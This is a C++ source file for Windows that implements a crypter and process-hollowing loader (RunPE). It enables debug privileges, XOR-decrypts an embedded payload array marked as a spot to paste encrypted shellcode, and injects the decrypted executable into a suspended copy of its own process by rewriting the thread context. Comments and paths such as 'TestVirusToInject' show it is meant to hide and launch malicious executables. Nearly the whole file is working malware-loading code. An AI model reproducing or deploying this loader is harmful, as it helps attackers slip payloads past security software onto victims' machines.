
#include <iostream> // Standard C++ library for console I/O
#include <fstream> 
#include <string> // Standard C++ Library for string manip
#include "Shlwapi.h"
#include <Windows.h> // WinAPI Header
#include <TlHelp32.h> //WinAPI Process API
#include <psapi.h>
#include <tchar.h>
#include <stdio.h>

/**
* Get debug privileges fo current process token
*/
BOOL EnableDebugPrivileges(void)
{
	HANDLE token;
	TOKEN_PRIVILEGES priv;
	BOOL ret = FALSE;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
	{
		priv.PrivilegeCount = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid) != FALSE &&
			AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE)
		{
			ret = TRUE;
		}
		CloseHandle(token);
	}
	return ret;
}

// Read executable from disk
HANDLE MapFileToMemory(LPCSTR filename)
{
	std::streampos size;
	std::fstream file(filename, std::ios::in | std::ios::binary | std::ios::ate);
	if (file.is_open())
	{
		size = file.tellg();

		char* Memblock = new char[size]();

		file.seekg(0, std::ios::beg);
		file.read(Memblock, size);
		file.close();

		//write to another executable
		/*
		std::fstream myfile("C:\\Users\\User-PC\\Documents\\Visual Studio 2015\\Projects\\TestVirusToInject\\Debug\\TestVirusToInject2.exe",std::ios::out | std::ios::binary);
		myfile.write(Memblock, size);
		myfile.close(); */
		return Memblock;
	}
	return 0;
}

// enter valid bytes of a program here.
//Using 010 Hex editor or HxD - copy all as C hex works perfectly. A complete hexdump, no magic ;)
void decrypt(char* rawData, int length)
{
	char key = 0x42;
	char key2 = 0x35;
	for (int i = 0; i < length; i++)
	{
		rawData[i] = (char)(rawData[i] ^ key ^ key2);
	}
	char* Memblock = rawData;
	std::fstream myfile("C:\\Visual Studio\\TestApp\\Release\\TestApp2.exe", std::ios::out | std::ios::binary);
	myfile.write(Memblock, length);
	myfile.close();

}

int RunPortableExecutable(void* Image)
{
	std::string name;
	IMAGE_DOS_HEADER* DOSHeader; // For Nt DOS Header symbols
	IMAGE_NT_HEADERS* NtHeader; // For Nt PE Header objects & symbols
	IMAGE_SECTION_HEADER* SectionHeader;

	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;

	CONTEXT* CTX;

	DWORD* ImageBase; //Base address of the image
	void* pImageBase; // Pointer to the image base

	int count;
	char CurrentFilePath[1024];
	HMODULE hMods[1024];
	DWORD cbNeeded;

	DOSHeader = PIMAGE_DOS_HEADER(Image); // Initialize Variable
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew); // Initialize

	wchar_t buf[256];

	HWND windowHandle = FindWindowW(NULL, L"ConsoleApplication1");
	DWORD* processID = new DWORD;
	/*processID = GetProcessId("explorer");
	GetWindowThreadProcessId(windowHandle, processID);
	printf("\nProcess ID: %u\n", processID);
	HANDLE RunningProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 23248);
	EnumProcessModules(RunningProcess, hMods, sizeof(hMods), &cbNeeded);
	GetModuleFileNameExA(RunningProcess, 0, CurrentFilePath, MAX_PATH); // path to current executable
	printf(CurrentFilePath);
	printf("\n");*/
	GetModuleFileNameA(0, CurrentFilePath, 1024); // path to current executable
	//printf(CurrentFilePath);
	//printf("\n");

	if (NtHeader->Signature == IMAGE_NT_SIGNATURE) // Check if image is a PE File.
	{
		printf("test1\n");
		ZeroMemory(&PI, sizeof(PI)); // Null the memory
		ZeroMemory(&SI, sizeof(SI)); // Null the memory

		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
			CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) // Create a new instance of current
													 //process in suspended state, for the new image.
		{
			printf("test2\n");
			// Allocate memory for the context.
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL; // Context is allocated
											  //printf("%d\n",PI.hThread);
											  //printf("%d\n",GetThreadContext(PI.hThread, LPCONTEXT(CTX)));
			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX))) //if context is in thread
			{
				printf("test3\n");
				// Read instructions
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);

				//typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
				//NtUnmapViewOfSection xNtUnmapViewOfSection;
				//xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
				//if (0 == xNtUnmapViewOfSection(PI.hProcess, PVOID(ImageBase))) {  // Unmap target code
				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
				printf("%u", GetLastError());
				// Write the image to the process
				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);

				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
				{
					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));

					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
				}
				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);

				// Move address of entry point to the eax register
				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(PI.hThread, LPCONTEXT(CTX)); // Set the context
				ResumeThread(PI.hThread); //´Start the process/call main()
				printf("tst");
				return 0; // Operation was successful.
			}
			else {
				printf("%u", GetLastError());
			}
			//}
			if (PI.hProcess) CloseHandle(PI.hProcess);
			if (PI.hThread) CloseHandle(PI.hThread);
		}
		else {
			printf("[ERROR] CreateProcess failed, Error = %x\n", GetLastError());
		}
	}
}

//Place encrypted shellcode here - fix length also!
const int length = 73802;
char rawData[length] = { [shellcode here] };



int main()
{
	decrypt(rawData, length);
	RunPortableExecutable(rawData); // run executable from the array
	getchar();
	return 0;
}
